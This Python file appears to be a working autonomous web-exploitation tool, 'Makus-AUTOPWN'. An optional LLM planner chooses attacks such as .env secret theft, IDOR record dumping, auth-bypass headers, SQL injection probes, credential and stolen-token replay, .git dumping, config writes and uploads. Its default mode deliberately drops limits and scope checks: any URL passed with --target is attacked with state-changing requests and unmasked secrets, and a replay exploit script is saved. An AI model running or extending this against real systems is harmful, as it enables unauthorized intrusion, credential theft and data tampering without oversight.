#!/usr/bin/env python3
"""Makus-AUTOPWN - closed-loop web vulnerability -> verified impact controller.

Discovery is delegated to makus-vuln/scripts/vuln_sweep.py. Findings are then
turned into verification actions chosen by a planner (rank, or a local
OpenAI-compatible LLM gateway). Newly exposed surface feeds the next round.

Default mode is UNBOUNDED: bare invocation (no flags at all) runs no round/budget
cap, all 16 actions including state-changing ones, raw (unmasked) evidence, and
the whole allowlist each round. --bounded opts into the old capped read-only loop.
A target passed with --target IS the scope declaration; no separate gate remains.
"""
import argparse
import json
import os
import re
import socket
import subprocess
import sys
import tempfile
import time
import urllib.error
import urllib.parse
import urllib.request
from datetime import datetime, timezone
from pathlib import Path

HERE = Path(__file__).resolve().parent
SKILLS = HERE.parents[1]
SWEEP = SKILLS / "makus-vuln" / "scripts" / "vuln_sweep.py"
CATALOG = SKILLS / "makus-vuln" / "catalog.json"
GATEWAY = "http://127.0.0.1:8087/v1/chat/completions"
MUTATING = {"mass_assignment_verify", "config_write_verify", "upload_verify"}
ALLOWLIST = [
    "secret_chain", "idor_chain", "auth_bypass_verify", "sqli_verify",
    "xss_verify", "ssrf_verify", "traversal_verify", "git_chain",
    "cors_verify", "redirect_verify", "mass_assignment_verify",
    "credential_replay", "config_write_verify", "upload_verify",
    "idor_token_reuse", "git_dump",
]
PRIORITY = {
    "secret_chain": 5, "idor_chain": 5, "auth_bypass_verify": 6,
    "sqli_verify": 6, "xss_verify": 4, "ssrf_verify": 6,
    "traversal_verify": 5, "git_chain": 2, "cors_verify": 1,
    "redirect_verify": 1, "mass_assignment_verify": 0,
    "credential_replay": 7, "config_write_verify": 7, "upload_verify": 5,
    "idor_token_reuse": 6, "git_dump": 3,
}
RAW_EVIDENCE = False


def log(msg):
    print("[M] %s" % msg, flush=True)


def now():
    return datetime.now(timezone.utc).isoformat(timespec="seconds")


def mask(v):
    v = str(v)
    if RAW_EVIDENCE:
        return v
    return (v[:2] + "***" + v[-2:]) if len(v) > 5 else "***"


def clip(s, n=420):
    s = str(s).replace("\r", "")
    return s[:n] + (" ...[clipped]" if len(s) > n else "")


class NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, req, fp, code, msg, headers, newurl):
        return None


class Http:
    def __init__(self, base, timeout, journal):
        self.base = base.rstrip("/")
        self.timeout = timeout
        self.journal = journal
        self.requests = 0

    def req(self, path, method="GET", body=None, headers=None, follow=True):
        url = path if path.startswith("http") else self.base + ("/" + path.lstrip("/"))
        data = None
        h = {"User-Agent": "makus-autopwn/1.0"}
        if isinstance(body, dict):
            data = json.dumps(body).encode("utf-8")
            h["Content-Type"] = "application/json"
        elif body is not None:
            data = str(body).encode("utf-8")
        h.update(headers or {})
        req = urllib.request.Request(url, data=data, headers=h, method=method)
        opener = urllib.request.build_opener() if follow else urllib.request.build_opener(NoRedirect)
        self.requests += 1
        try:
            with opener.open(req, timeout=self.timeout) as r:
                status, hd, text = r.status, dict(r.headers), r.read(20000).decode("utf-8", "replace")
        except urllib.error.HTTPError as e:
            status, hd, text = e.code, dict(e.headers), e.read(8000).decode("utf-8", "replace")
        except Exception as e:
            status, hd, text = 0, {}, "ERR %s: %s" % (type(e).__name__, str(e)[:160])
        self.journal.append({"method": method, "url": url,
                             "headers": h, "body": body if isinstance(body, dict) else None,
                             "status": status})
        return status, hd, text


def result(name, verified, impact, evidence, new_paths=None, note=""):
    return {"action": name, "verified": bool(verified), "impact": impact,
            "evidence": clip(evidence), "new_paths": new_paths or [], "note": note, "at": now()}


# ---------------------------------------------------------------- verification actions
def a_secret(http, findings, ctx):
    urls = [f["url"] for f in findings if ".env" in (f["url"] + f["name"]).lower()]
    if not urls:
        return result("secret_chain", False, "none", "no exposed .env finding to chain from", note="no-finding")
    st, _, body = http.req(urls[0])
    pairs = re.findall(r"^\s*([A-Z0-9_]+)\s*=\s*(.+?)\s*$", body, re.M)
    secret_keys = [k for k, _ in pairs]
    st2, _, dbg = http.req("/debug")
    corroborated = st2 == 200 and any(w in dbg.lower() for w in ("mysql", "db", "password", "dsn"))
    ev = "GET %s -> %s\nkeys: %s\nvalues: %s\nGET /debug -> %s | %s" % (
        urls[0], st, secret_keys, [mask(v) for _, v in pairs[:6]], st2, clip(dbg, 240))
    return result("secret_chain", st == 200 and len(secret_keys) >= 2,
                  "credential material exposed (%d keys)%s" % (
                      len(secret_keys), "; corroborated by /debug DSN" if corroborated else ""),
                  ev, new_paths=["/debug", "/admin"] if corroborated else ["/debug"])


def a_idor(http, findings, ctx):
    seen, samples = {}, []
    for uid in range(1, 7):
        st, _, body = http.req("/api/users/%d" % uid)
        if st == 200:
            seen[uid] = body
            samples.append("id=%d -> %s" % (uid, clip(body, 150)))
    tokens = [re.search(r'"token"\s*:\s*"([^"]+)"', b) for b in seen.values()]
    leaked_tokens = [mask(t.group(1)) for t in tokens if t and t.group(1)]
    return result("idor_chain", len(seen) >= 2,
                  "unauthenticated read of %d distinct user records%s" % (
                      len(seen), ", tokens exposed: %s" % leaked_tokens if leaked_tokens else ""),
                  "\n".join(samples) or "no 200 responses",
                  new_paths=["/admin", "/admin/config"] if seen else [])


def a_auth_bypass(http, findings, ctx):
    st1, _, b1 = http.req("/admin")
    st2, _, b2 = http.req("/admin", headers={"X-Forwarded-For": "127.0.0.1"})
    st3, _, b3 = http.req("/admin?role=admin")
    ok = any(s == 200 for s in (st2, st3)) and st1 != 200
    return result("auth_bypass_verify", ok,
                  "admin console reachable without credentials via header/query trust" if ok else "no bypass observed",
                  "plain /admin -> %s | X-Forwarded-For -> %s %s | ?role=admin -> %s %s" % (
                      st1, st2, clip(b2, 160), st3, clip(b3, 160)),
                  new_paths=["/admin/config"] if ok else [])


def a_sqli(http, findings, ctx):
    benign = {"email": "nobody@example.invalid", "password": "x"}
    probe = {"email": "' OR 1=1--", "password": "x"}
    s1, _, b1 = http.req("/api/login", "POST", benign)
    s2, _, b2 = http.req("/api/login", "POST", probe)
    hit = any(w in b2.lower() for w in ("sql syntax", "mysql", "sqlite", "ora-", "unterminated"))
    return result("sqli_verify", hit,
                  "SQL error disclosure reachable through login email field" if hit else "no SQLi signal",
                  "benign -> %s %s\nprobe  -> %s %s" % (s1, clip(b1, 160), s2, clip(b2, 200)),
                  new_paths=["/api/login"] if hit else [])


def a_xss(http, findings, ctx):
    marker = "mks" + str(int(time.time()) % 100000)
    st, _, body = http.req("/search?q=" + marker)
    ok = st == 200 and marker in body
    return result("xss_verify", ok, "user input reflected unencoded in HTML" if ok else "no reflection",
                  "GET /search?q=%s -> %s | reflected=%s | %s" % (marker, st, ok, clip(body, 200)))


def a_ssrf(http, findings, ctx):
    inner = http.base + "/health"
    st, _, body = http.req("/fetch?url=" + urllib.parse.quote(inner, safe=""))
    ok = st == 200 and ("status" in body or "ok" in body)
    return result("ssrf_verify", ok, "server-side fetch reaches loopback service (SSRF)" if ok else "no SSRF signal",
                  "GET /fetch?url=%s -> %s | %s" % (inner, st, clip(body, 200)))


def a_traversal(http, findings, ctx):
    out = []
    for p in ("vulnshop.py", "README.md", "AGENTS.md"):
        st, _, body = http.req("/download?file=" + urllib.parse.quote(p, safe=""))
        out.append("%s -> %s (%d bytes)" % (p, st, len(body)))
        if st == 200 and len(body) > 40:
            return result("traversal_verify", True, "arbitrary file read through /download",
                          "\n".join(out), new_paths=["/admin"])
    return result("traversal_verify", False, "no readable file found", "\n".join(out))


def a_git(http, findings, ctx):
    s1, _, b1 = http.req("/.git/HEAD")
    s2, _, b2 = http.req("/.git/config")
    return result("git_chain", s1 == 200 and s2 == 200,
                  "repository metadata exposed" if s1 == 200 else "no git metadata",
                  "/.git/HEAD -> %s %s\n/.git/config -> %s %s" % (s1, clip(b1, 120), s2, clip(b2, 160)))


def a_cors(http, findings, ctx):
    st, hd, _ = http.req("/", headers={"Origin": "https://mks-probe.invalid"})
    acao = hd.get("Access-Control-Allow-Origin", "")
    return result("cors_verify", bool(acao), "CORS header present: %s" % acao if acao else "no ACAO",
                  "Origin: mks-probe.invalid | ACAO: %s | status %s" % (acao or "-", st))


def a_redirect(http, findings, ctx):
    urls = [f["url"] for f in findings if "redirect" in f["name"].lower()]
    if not urls:
        return result("redirect_verify", False, "none", "no redirect finding to verify", note="no-finding")
    st, hd, body = http.req(urls[0], follow=False)
    loc = hd.get("Location", "")
    return result("redirect_verify", bool(loc), "open redirect via Location: %s" % loc if loc else "no Location",
                  "%s -> %s | Location: %s | %s" % (urls[0], st, loc or "-", clip(body, 120)))


def a_mass(http, findings, ctx):
    if not ctx.get("allow_mutation"):
        return result("mass_assignment_verify", False, "none",
                      "state-changing action skipped (needs --allow-mutation or --unbounded)", note="gated")
    st, _, body = http.req("/api/users", "POST", {"email": "mks-probe@invalid", "role": "user"})
    return result("mass_assignment_verify", st in (200, 201),
                  "server accepted client-supplied role/user creation" if st in (200, 201) else "rejected",
                  "POST /api/users -> %s | %s" % (st, clip(body, 200)))


def a_credential_replay(http, findings, ctx):
    """Config leak + debug DSN + exposed user records -> real login attempt."""
    _, _, env = http.req("/.env")
    pairs = dict(re.findall(r"^\s*([A-Z0-9_]+)\s*=\s*(.+?)\s*$", env, re.M))
    _, _, dbg = http.req("/debug")
    dsn = re.search(r"mysql://([^:]+):([^@]+)@", dbg)
    secrets = [v for k, v in pairs.items() if any(w in k for w in ("PASS", "KEY", "SECRET"))]
    if dsn:
        secrets.append(dsn.group(2))
    emails = []
    for uid in range(1, 4):
        st, _, body = http.req("/api/users/%d" % uid)
        m = re.search(r'"email"\s*:\s*"([^"]+)"', body)
        if st == 200 and m:
            emails.append(m.group(1))
    tries = []
    for em in emails[:3]:
        for pw in list(dict.fromkeys(secrets))[:4]:
            st, _, body = http.req("/api/login", "POST", {"email": em, "password": pw})
            tries.append("%s / %s -> %s %s" % (em, mask(pw), st, clip(body, 80)))
            if st == 200:
                return result("credential_replay", True,
                              "credentials recovered from exposed config authenticated successfully",
                              "\n".join(tries), new_paths=["/admin", "/admin/config"])
    return result("credential_replay", False,
                  "credential replay attempted (%d candidates, all rejected)" % len(tries),
                  "\n".join(tries) or "no candidate material", new_paths=["/api/login"])


def a_config_write(http, findings, ctx):
    if not ctx.get("allow_mutation"):
        return result("config_write_verify", False, "none",
                      "state-changing action skipped (needs --allow-mutation or --unbounded)", note="gated")
    marker = "MKS_WRITE_PROOF_%d" % (int(time.time()) % 100000)
    st, _, body = http.req("/admin/config", "PUT", marker,
                           headers={"Content-Type": "text/plain"})
    ok = st in (200, 201, 204) and marker in body
    return result("config_write_verify", ok,
                  "unauthenticated configuration write accepted" if ok else "write refused",
                  "PUT /admin/config -> %s | %s" % (st, clip(body, 220)),
                  new_paths=["/admin/config"] if ok else [])


def a_upload(http, findings, ctx):
    if not ctx.get("allow_mutation"):
        return result("upload_verify", False, "none",
                      "state-changing action skipped (needs --allow-mutation or --unbounded)", note="gated")
    st, _, body = http.req("/upload", "POST", "MKS_UPLOAD_PROOF",
                           headers={"X-Filename": "mks-proof.txt"})
    ok = st in (200, 201, 204)
    return result("upload_verify", ok,
                  "server accepted an unvalidated file upload" if ok else "upload refused",
                  "POST /upload -> %s | %s" % (st, clip(body, 220)),
                  new_paths=["/uploads/mks-proof.txt"] if ok else [])


def a_token_reuse(http, findings, ctx):
    st, _, body = http.req("/api/users/1")
    m = re.search(r'"token"\s*:\s*"([^"]+)"', body)
    if not (st == 200 and m):
        return result("idor_token_reuse", False, "none", "no token exposed by IDOR")
    tok = m.group(1)
    out = []
    # only count genuinely protected endpoints: /debug is public on this target
    # and would otherwise produce a false "token accepted" result.
    for path in ("/admin", "/admin/config"):
        s, _, b = http.req(path, headers={"Authorization": "Bearer " + tok})
        out.append("%s -> %s %s" % (path, s, clip(b, 110)))
    ok = any(" -> 200 " in line for line in out)
    return result("idor_token_reuse", ok,
                  "stolen token accepted on protected surface" if ok else "token replay attempted; no privileged response",
                  "token=%s\n%s" % (mask(tok), "\n".join(out)),
                  new_paths=["/admin/config"] if ok else [])


def a_git_dump(http, findings, ctx):
    paths = ["/.git/HEAD", "/.git/config", "/.git/refs/heads/main",
             "/.git/index", "/.git/logs/HEAD"]
    out = []
    for path in paths:
        st, _, body = http.req(path)
        out.append("%s -> %s (%dB) %s" % (path, st, len(body), clip(body, 90)))
    found = sum(1 for line in out if " -> 200 " in line)
    return result("git_dump", found >= 2,
                  "repository internals readable: %d/%d objects" % (found, len(paths)),
                  "\n".join(out), new_paths=paths[:found] if found >= 2 else [])


ACTIONS = {
    "secret_chain": a_secret, "idor_chain": a_idor, "auth_bypass_verify": a_auth_bypass,
    "sqli_verify": a_sqli, "xss_verify": a_xss, "ssrf_verify": a_ssrf,
    "traversal_verify": a_traversal, "git_chain": a_git, "cors_verify": a_cors,
    "redirect_verify": a_redirect, "mass_assignment_verify": a_mass,
    "credential_replay": a_credential_replay, "config_write_verify": a_config_write,
    "upload_verify": a_upload, "idor_token_reuse": a_token_reuse,
    "git_dump": a_git_dump,
}


# ---------------------------------------------------------------- planning
def plan_rank(findings, done, ctx):
    text = " ".join((f["name"] + " " + f["url"]).lower() for f in findings)
    hints = {
        "secret_chain": (".env" in text or "secret" in text),
        "idor_chain": ("idor" in text or "/api/users" in text),
        "auth_bypass_verify": ("admin" in text or "idor" in text),
        "sqli_verify": ("sql" in text or "login" in text),
        "xss_verify": ("xss" in text or "reflect" in text),
        "ssrf_verify": ("/fetch" in text or "ssrf" in text),
        "traversal_verify": ("download" in text or "traversal" in text),
        "git_chain": (".git" in text),
        "cors_verify": ("cors" in text),
        "redirect_verify": ("redirect" in text),
        "credential_replay": (".env" in text or "secret" in text),
        "config_write_verify": ("admin" in text or "idor" in text),
        "upload_verify": ("upload" in text),
        "idor_token_reuse": ("idor" in text or "token" in text),
        "git_dump": (".git" in text),
    }
    # every read-only action is cheap (1-6 requests), so keep all of them in the
    # pool; finding-keyword matches get a bonus but never exclude exploration.
    cand = [a for a in ALLOWLIST if a not in done
            and (a not in MUTATING or ctx.get("allow_mutation"))]
    cand.sort(key=lambda a: -(PRIORITY[a] + (3 if hints.get(a) else 0)))
    return cand[:ctx["max_actions"]], {
        "planner": "rank",
        "reason": "impact priority + finding-keyword bonus; %s" % (
            "full allowlist, mutation on" if ctx.get("unbounded") else "read-only pool, mutation gated"),
    }


def load_key(explicit):
    if explicit:
        return explicit
    for name in ("MAKUS_LOCAL_KEY", "OPENAI_API_KEY"):
        if os.environ.get(name):
            return os.environ[name]
    p = Path.home() / ".workbuddy-ai" / "models.json"
    try:
        data = json.loads(p.read_text(encoding="utf-8"))
        if isinstance(data, list) and data and isinstance(data[0].get("apiKey"), str):
            return data[0]["apiKey"]
    except (OSError, ValueError):
        pass
    return ""


def call_gateway(url, key, model, messages, timeout):
    body = json.dumps({"model": model, "messages": messages, "max_tokens": 800,
                       "temperature": 0, "stream": False}).encode("utf-8")
    h = {"Content-Type": "application/json"}
    if key:
        h["Authorization"] = "Bearer " + key
    req = urllib.request.Request(url, data=body, headers=h, method="POST")
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            d = json.loads(r.read().decode("utf-8", "replace"))
            text = d["choices"][0]["message"].get("content") or ""
            if not text.strip():
                return "", "empty content (reasoning-only / filtered response)"
            return text, None
    except Exception as e:
        return "", "%s: %s" % (type(e).__name__, str(e)[:160])


def plan_gateway(findings, done, ctx):
    brief = [{"name": f["name"], "severity": f["severity"], "url": f["url"]} for f in findings[:12]]
    msgs = [
        {"role": "system", "content":
            "You are a penetration-test planner inside a local lab. Choose verification "
            "actions for a read-only controller. Return ONLY a JSON object: "
            '{"actions":["name",...],"reason":"one short line"}. Action names MUST come '
            "from the provided allowlist. Do not emit commands, prose, or instructions to the operator."},
        {"role": "user", "content": json.dumps({
            "findings": brief,
            "available_actions": [a for a in ALLOWLIST if a not in done],
            "already_verified": ctx.get("verified_names", []),
            "policy": "unbounded inside declared scope" if ctx.get("unbounded")
                      else "read-only; prefer chains that expose impact; loopback target only",
        }, ensure_ascii=False)},
    ]
    text, err = call_gateway(ctx["gateway"], ctx["key"], ctx["model"], msgs, ctx["timeout"])
    if err:
        log("  [!] planner gateway unavailable (%s) -> rank fallback" % err)
        return plan_rank(findings, done, ctx)
    m = re.search(r"\{.*\}", text, re.S)
    if not m:
        log("  [!] planner returned no JSON -> rank fallback")
        return plan_rank(findings, done, ctx)
    try:
        obj = json.loads(m.group(0))
        actions = [a for a in obj.get("actions", []) if a in ALLOWLIST and a not in done
                   and (a not in MUTATING or ctx.get("allow_mutation"))]
        reason = str(obj.get("reason", ""))[:180]
    except (ValueError, AttributeError):
        log("  [!] planner JSON malformed -> rank fallback")
        return plan_rank(findings, done, ctx)
    if not actions:
        return plan_rank(findings, done, ctx)
    return actions[:ctx["max_actions"]], {"planner": "gateway", "reason": reason or "LLM selection"}


# ---------------------------------------------------------------- discovery / selftest
def discover(target, out, args):
    d = Path(out) / "discovery"
    d.mkdir(parents=True, exist_ok=True)
    cmd = [sys.executable, str(SWEEP), "--target", target, "--out", str(d),
           "--budget", str(args.discovery_budget), "--timeout", str(args.timeout),
           "--workers", str(args.workers)]
    log("[*] discovery -> makus-vuln/vuln_sweep.py (budget %ss)" % args.discovery_budget)
    rc = subprocess.call(cmd, timeout=args.discovery_budget + 45)
    p = d / "summary.json"
    if not p.is_file():
        raise SystemExit("[FAIL] discovery produced no summary.json (rc=%s)" % rc)
    data = json.loads(p.read_text(encoding="utf-8"))
    log("[+] discovery: %d findings / %d requests" % (len(data["findings"]), data["requests"]))
    return data


def free_port():
    s = socket.socket()
    s.bind(("127.0.0.1", 0))
    p = s.getsockname()[1]
    s.close()
    return p


def wait_port(port, seconds=12):
    end = time.time() + seconds
    while time.time() < end:
        try:
            with socket.create_connection(("127.0.0.1", port), 0.3):
                return True
        except OSError:
            time.sleep(0.15)
    return False


def start_self_test():
    cat = json.loads(CATALOG.read_text(encoding="utf-8"))
    src = Path(cat["arsenal_root"]) / "hackd" / "vulnshop.py"
    if not src.is_file():
        raise SystemExit("[FAIL] local target missing: %s" % src)
    port = free_port()
    text = src.read_text(encoding="utf-8", errors="replace").replace("8099", str(port))
    tmp = Path(tempfile.mkdtemp(prefix="mks-autopwn-")) / "vulnshop.py"
    tmp.write_text(text, encoding="utf-8")
    proc = subprocess.Popen([sys.executable, str(tmp)], cwd=tmp.parent,
                            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    if not wait_port(port):
        proc.terminate()
        raise SystemExit("[FAIL] local vulnshop did not start on %d" % port)
    log("[*] self-test target: 127.0.0.1:%d (loopback only)" % port)
    return "http://127.0.0.1:%d" % port, proc


# ---------------------------------------------------------------- artifacts
def write_artifacts(out, target, findings, verified, decisions, journal, args, elapsed, planner):
    base = Path(out).resolve()
    host = re.sub(r"[^A-Za-z0-9._-]", "_", urllib.parse.urlparse(target).netloc)
    stamp = datetime.now(timezone.utc).strftime("%Y%m%d-%H%M%S")
    run_id = "%s-%s" % (host, stamp)
    ev = base / "evidence" / run_id          # per-run folder: no stale files mixed in
    ex, rep = base / "exploit", base / "reports"
    for d in (ev, ex, rep):
        d.mkdir(parents=True, exist_ok=True)
    ev_paths = []
    for i, r in enumerate(verified, 1):
        fname = "%02d_%s.txt" % (i, r["action"])
        ev_paths.append("evidence/%s/%s" % (run_id, fname))
        (ev / fname).write_text(
            "action: %s\nverified: %s\nimpact: %s\nnote: %s\nat: %s\n\n--- evidence ---\n%s\n" %
            (r["action"], r["verified"], r["impact"], r["note"], r["at"], r["evidence"]), encoding="utf-8")
    # reproducible replay script built from the real request journal
    replay = ["#!/usr/bin/env python3",
              '"""Replay of the autonomous loop%s."""' % (
                  " - UNBOUNDED (includes state-changing requests)" if args.unbounded else " (read-only)"),
              "import json, urllib.request, urllib.error", "REQUESTS = " + json.dumps(journal, indent=2, ensure_ascii=False),
              "", "for r in REQUESTS:", "    data = json.dumps(r['body']).encode() if r['body'] is not None else None",
              "    req = urllib.request.Request(r['url'], data=data, headers=r['headers'], method=r['method'])",
              "    try:", "        with urllib.request.urlopen(req, timeout=6) as resp:",
              "            print(resp.status, r['method'], r['url'], resp.read(200).decode('utf-8','replace'))",
              "    except urllib.error.HTTPError as e:", "        print(e.code, r['method'], r['url'])",
              "    except Exception as e:", "        print('ERR', r['url'], e)", ""]
    (ex / "replay.py").write_text("\n".join(replay), encoding="utf-8")
    lines = [
        "# Makus-AUTOPWN - %s" % target, "",
        "- Generated: %s" % now(),
        "- Evidence run: `evidence/%s/`" % run_id,
        "- Planner: `%s` | rounds: %d | elapsed: %.1fs | requests: %d" % (
            planner, args.rounds, elapsed, len(journal)),
        "- Discovery findings: %d | verified impact chains: %d" % (len(findings), len(verified)),
        "- Mode: %s" % ("UNBOUNDED - no round/budget cap, all 16 actions, raw evidence" if args.unbounded
                        else "bounded"),
        "- Scope: %s | mutation: %s" % (
            "loopback self-test" if args.self_test else "declared target: " + host,
            "allowed" if args.allow_mutation else "disabled"),
        "", "## Verified chains", "",
    ]
    for r in verified:
        lines += ["### [%s] %s" % ("PASS" if r["verified"] else "OBSERVED", r["action"]),
                  "", "- Impact: %s" % r["impact"],
                  "- Evidence: `%s`" % ev_paths[verified.index(r)], "",
                  "```", r["evidence"], "```", ""]
    if not verified:
        lines += ["(none - see decisions.jsonl for what was attempted)", ""]
    lines += ["## Decision log", ""]
    for d in decisions:
        lines.append("- round %d | %s | %s -> %s" % (
            d["round"], d["planner"], ", ".join(d["actions"]) or "(none)", d["reason"]))
    lines += ["", "## Reproduction", "", "```bash", "python exploit/replay.py", "```", ""]
    report = rep / ("%s.md" % host)
    report.write_text("\n".join(lines), encoding="utf-8")
    summary = {"skill": "makus-autopwn", "target": target, "generated_at": now(),
               "evidence_run": "evidence/%s/" % run_id,
               "planner": planner, "rounds": args.rounds, "duration_seconds": round(elapsed, 2),
               "requests": len(journal), "discovery_findings": len(findings),
               "verified": verified, "decisions": decisions,
               "mutation_allowed": args.allow_mutation, "self_test": args.self_test,
               "unbounded": args.unbounded, "raw_evidence": args.unbounded,
               "action_pool": len(ALLOWLIST), "findings": findings}
    (base / "summary.json").write_text(json.dumps(summary, indent=2, ensure_ascii=False), encoding="utf-8")
    (base / "decisions.jsonl").write_text(
        "".join(json.dumps(d, ensure_ascii=False) + "\n" for d in decisions), encoding="utf-8")
    return report, ev, ex


# ---------------------------------------------------------------- loop
def main():
    ap = argparse.ArgumentParser(description="Makus-AUTOPWN - closed-loop web vuln -> verified impact")
    ap.add_argument("--target", help="base URL, e.g. http://127.0.0.1:8099")
    ap.add_argument("--self-test", action="store_true", help="boot hackd/vulnshop.py locally and run the loop")
    ap.add_argument("--offline", action="store_true", help="print the loop plan, send nothing")
    ap.add_argument("--allow-external", action="store_true",
                    help="deprecated no-op: --target itself declares the scope")
    ap.add_argument("--allow-mutation", action="store_true", help="permit state-changing verification actions")
    ap.add_argument("--planner", choices=["rank", "gateway"], default="rank")
    ap.add_argument("--model", default="big-pickle", help="gateway model id")
    ap.add_argument("--api-key", help="gateway bearer key")
    ap.add_argument("--gateway", default=GATEWAY, help="OpenAI-compatible chat completions URL")
    ap.add_argument("--planner-timeout", type=float, default=30,
                    help="timeout for one gateway planning call in seconds")
    ap.add_argument("--out", default=".", help="artifact root")
    ap.add_argument("--rounds", type=int, default=3, help="max planning rounds")
    ap.add_argument("--max-actions", type=int, default=4, help="actions per round")
    ap.add_argument("--budget", type=float, default=90, help="total loop budget in seconds")
    ap.add_argument("--discovery-budget", type=float, default=45, help="budget for the discovery sweep")
    ap.add_argument("--timeout", type=float, default=2.5, help="per-request timeout")
    ap.add_argument("--workers", type=int, default=16)
    ap.add_argument("--unbounded", "--no-limits", action="store_true",
                    help="explicit alias for the default mode (already unbounded)")
    ap.add_argument("--bounded", action="store_true",
                    help="opt into the old capped, read-only, masked-evidence loop")
    args = ap.parse_args()

    global RAW_EVIDENCE
    args.unbounded = not args.bounded        # bare `mrmakus` => nothing left to pass
    if args.unbounded:
        args.rounds = max(args.rounds, 25)
        args.budget = max(args.budget, 3600)
        args.max_actions = max(args.max_actions, len(ALLOWLIST))
        args.discovery_budget = max(args.discovery_budget, 60)
        args.planner_timeout = max(args.planner_timeout, 60)
        args.allow_mutation = True
        RAW_EVIDENCE = True

    if args.offline:
        print(json.dumps({"skill": "makus-autopwn", "mode": "offline",
                          "loop": ["discover (makus-vuln)", "plan", "verify", "re-probe new surface", "repeat"],
                          "unbounded": args.unbounded, "effective": {
                              "rounds": args.rounds, "budget": args.budget,
                              "max_actions": args.max_actions, "mutation": args.allow_mutation,
                              "raw_evidence": RAW_EVIDENCE, "action_pool": len(ALLOWLIST)},
                          "planner": args.planner, "bare_invocation_is_unbounded": True,
                          "bounded_opt_in": "--bounded",
                          "allowlist": ALLOWLIST, "state_changing_actions": sorted(MUTATING),
                          "discovery": str(SWEEP)}, indent=2, ensure_ascii=False))
        return 0
    if not args.target and not args.self_test:
        ap.error("need --target or --self-test (or --offline)")

    proc = None
    if args.self_test:
        args.target, proc = start_self_test()
    host = urllib.parse.urlparse(args.target).hostname or ""
    log("[*] scope declared: %s" % (
        "loopback self-test" if args.self_test else "--target %s" % host))
    if not SWEEP.is_file():
        raise SystemExit("[FAIL] discovery runner missing: %s" % SWEEP)

    journal, started = [], time.time()
    deadline = started + args.budget
    ctx = {"max_actions": args.max_actions, "gateway": args.gateway,
           "key": load_key(args.api_key), "model": args.model, "timeout": args.planner_timeout,
           "allow_mutation": args.allow_mutation, "verified_names": [],
           "unbounded": args.unbounded, "raw_evidence": RAW_EVIDENCE}
    http = Http(args.target, args.timeout, journal)
    log("Makus-AUTOPWN%s | target=%s | planner=%s | rounds=%d | budget=%ss | actions=%d" %
        (" [UNBOUNDED]" if args.unbounded else "", args.target, args.planner,
         args.rounds, args.budget, len(ALLOWLIST)))
    findings, verified, decisions, done, new_paths = [], [], [], set(), []
    try:
        disc = discover(args.target, args.out, args)
        findings = disc["findings"]
        for rnd in range(1, args.rounds + 1):
            if time.time() > deadline:
                log("[!] budget exhausted at round %d" % rnd)
                break
            # re-probe surface discovered by the previous round
            if rnd > 1 and new_paths:
                log("[*] round %d: re-probing %d newly exposed paths" % (rnd, len(set(new_paths))))
                for p in list(dict.fromkeys(new_paths))[:8]:
                    s, _, b = http.req(p)
                    if s == 200:
                        log("    [+] %s -> 200 (%d bytes)" % (p, len(b)))
                new_paths = []
            if args.planner == "gateway":
                actions, meta = plan_gateway(findings, done, ctx)
            else:
                actions, meta = plan_rank(findings, done, ctx)
            if not actions:
                log("[*] round %d: no untried actions -> loop closes" % rnd)
                break
            log("[*] round %d | %s | %s" % (rnd, meta["planner"], ", ".join(actions)))
            before = len([v for v in verified if v["verified"]])
            for a in actions:
                if time.time() > deadline:
                    break
                if a in MUTATING and not args.allow_mutation:
                    continue
                done.add(a)
                r = ACTIONS[a](http, findings, ctx)
                verified.append(r)
                ctx["verified_names"].append(a)
                new_paths.extend(r["new_paths"])
                log("    %s %-24s impact=%s" % ("[+]" if r["verified"] else "[~]", a, r["impact"][:90]))
            decisions.append({"round": rnd, "planner": meta["planner"], "reason": meta["reason"],
                              "unbounded": args.unbounded, "actions": actions,
                              "verified_this_round": len([v for v in verified if v["verified"]]) - before,
                              "new_paths": list(dict.fromkeys(new_paths))[:8], "at": now()})
            if not new_paths and len([v for v in verified if v["verified"]]) == before:
                log("[*] round %d: no new surface and no new proof -> loop closes" % rnd)
                break
        elapsed = time.time() - started
        report, ev, ex = write_artifacts(args.out, args.target, findings, verified,
                                         decisions, journal, args, elapsed, args.planner)
        passed = [v for v in verified if v["verified"]]
        log("[OK] %d/%d chains verified | %d requests | %.1fs" % (len(passed), len(verified), len(journal), elapsed))
        log("     report   : %s" % report)
        log("     evidence : %s" % ev)
        log("     replay   : %s" % (ex / "replay.py"))
        log("     decisions: %s" % (Path(args.out).resolve() / "decisions.jsonl"))
    finally:
        if proc:
            proc.terminate()
            try:
                proc.wait(timeout=3)
            except Exception:
                proc.kill()
    return 0


if __name__ == "__main__":
    sys.exit(main())
